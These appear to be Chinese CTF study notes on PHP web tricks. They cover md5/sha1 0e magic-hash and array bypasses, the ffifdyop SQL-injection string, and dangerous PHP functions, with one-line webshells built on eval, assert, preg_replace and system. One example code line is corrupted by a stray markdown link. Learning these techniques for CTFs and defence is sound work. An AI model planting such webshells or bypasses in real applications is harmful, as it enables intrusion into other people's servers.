## 新生第一步，认识md5（five）
例题：
```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = [$_POST['password'];](url)
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?> 
```
如例题所示，要求传入的是两个参数，post一个password，get一个name,要求两个东西的参数内容不一样，但是md5的值要一样，看似是不可能的，但是，md5其实早已被前人们给创烂了，md5的对撞已经不是很难完成，但是，这里用的并不是md5的对撞，而是php语言的妙妙小特性：
在md5化之后，如果数据以0e加纯数字结尾，会被直接解析为0，以此达到相等的结果,这里贴出一些值:
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361

这里还有经过两次md5后值还相同的：
7r4lGXCH2Ksu2JNT3BYM
CbDLytmyGm2xQyaLNhWn
770hQgrBOjrcqftrlaZk

自己等于自己md5的：
0e215962017

同理，还有一种加密算法sha1也有这样的问题，这里一并贴出：
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799

还有一种很罕见的
NAN绕过，在处理时发生错误

sql注入相关：
md5后值是万能密码：ffifdyop

还有md5值和sha1相等的参考极客大挑战2024的题

这是第一种打法
那么，主播主播，找特殊值还是太困难了，有没有更简单更强势的打法呢？


有的兄弟，有的，像这么强势的打法不止这一种（bushi


介绍大名鼎鼎的数组绕过：
管他什么name[]=1password[]=2直接秒了，但是以后大概是没有这么顺利的题了


## 二、一些敏感的函数：
eval()
system()
assert()
exec()
preg_replace()
shell_exec()
call_user_func()
passthru()
array_map()
popen()
这些函数都是常见的敏感函数，容易造成一些危险的漏洞
当然也是很重要的考点，其具体作用参考(https://zhuanlan.zhihu.com/p/622502997)

这些是一个笼统的记录，他们有不同的危险特色：
###1、代码执行系
这些函数能够执行一些php的代码，造成危险，同时是flag的获取点
#### eval()
大名鼎鼎，臭名昭著。一句话木马常客一号。
```php
<?php @eval($_POST['shell']);?>
```
#### assert()
同样是很敏感的东西，一句话木马常客二号
```php
<?php assert(@$_POST['shell']); ?>
```
#### preg_replace()
这个不太常用，当匹配模式/e时，该函数会将$replacement作为php代码执行
贴一份对应一句话木马
```php
preg_replace("/test/e",$_GET["shell"],"just test");
```
剩下几个使用范围较少，有的甚至已经被弃用了，这里就不做介绍了：
create_function()  (**在php7.2.0后被废弃**)
array_map()
call_user_func()
call_user_func_array()
array_filter()

### 2、命令执行系

#### system() 
漏洞头头，这里放出一句话木马的形式：
```php
<?php
    system($_GET['cmd']);
?>
```
#### exec() 执行外部程序
```php
<?php 
    echo exec("whoami");
?>
```

#### shell_exec() 通过shell环境执行命令，并将完整的输出以字符串的方式返回
```php
<?php 
    echo shell_exec("whoami");
?>
```

剩下的由于不怎么常用，这里仅做列举
passthru() 执行外部程序并且显示原始输出
```php
<?php 
    passthru("whoami");
?>
```
proc_open() 执行一个命令，并且打开用来输入/输出的文件指针
pcntl_exec() 在当前进程空间执行指定程序
popen() 打开进程文件指针
反引号，实质上还是调用的shell_exec()函数，在CTF题目里面有的时候会忘记过滤导致直接拿到flag
### 文件包含系  
关于这一部分，详见文件包含专题
php中包含的函数一共有四个，主要作用为包含并运行指定文件
require() 函数
inclue() 函数
require_once() 函数
include_once() 函数
include()与require_once()主要的区别是：include()在包含的过程中如果出现错误，会抛出一个警告，程序继续运行；而require()函数出现错误时，会直接报错并退出程序的执行
require_once()和include_once()，显然表示的是文件只包含一次的意思，避免函数重定义和变量重新赋值等问题
这些函数通常配和伪协议来实现文件包含漏洞；
### SSRF系
~~没学过还不会，先放着~~
###  XXE系
~~也没学过~~

## 其他：
php的变量名使用字母数字和下滑线构成的，所以会将空格、+、点、[转换为下划线，但是当[提前出现后，后面的点就不会再变成_了


